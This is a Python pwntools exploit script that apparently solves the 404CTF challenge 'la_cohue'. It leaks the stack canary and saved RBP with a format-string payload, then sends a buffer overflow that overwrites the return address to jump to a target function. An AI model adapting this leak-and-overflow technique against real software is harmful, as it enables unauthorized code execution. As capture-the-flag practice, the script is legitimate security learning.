import pwn
import time

# index 8 : where we write,
# index 19: main addr


def main():
    # canary : 0x400877 # 0877 -> 4196471
    # exit : 0x601fe8

    elf_info = pwn.context.binary = pwn.ELF("./la_cohue")
    # process = pwn.process("./la_cohue")

    process = pwn.remote("challenges.404ctf.fr", 30223)

    time.sleep(0.5)
    canary_function_address = elf_info.symbols["canary"]
    pwn.log.info("Canary address: " + hex(canary_function_address))
    print(canary_function_address)
    print(process.clean().decode())
    process.sendline(b"2")
    # get canari value and rbp value. %17$p print the 17th value of the stack.
    payload = b"%17$p %18$p"
    process.sendline(payload)

    time.sleep(0.5)
    leak = process.clean()
    canari_address = leak.split(b"[Vous] :")[1].split(b" ")[1]
    canari_address = int(canari_address, 16)
    pwn.log.info("Canary address: " + hex(canari_address))
    rbp_address = leak.split(b"[Vous] :")[1].split(b" ")[2].split(b"\n")[0]
    rbp_address = int(rbp_address, 16)
    pwn.log.info("RBP address: " + hex(rbp_address))

    process.sendline(b"1")
    payload = b"A" * 72  # fill the buffer
    payload += pwn.p64(canari_address)
    payload += pwn.p64(rbp_address)
    payload += pwn.p64(canary_function_address)

    process.sendline(payload)
    time.sleep(0.5)
    print(process.clean().decode())

    process.sendline(b"3")
    time.sleep(0.5)
    print(process.clean().decode())


if __name__ == "__main__":
    main()
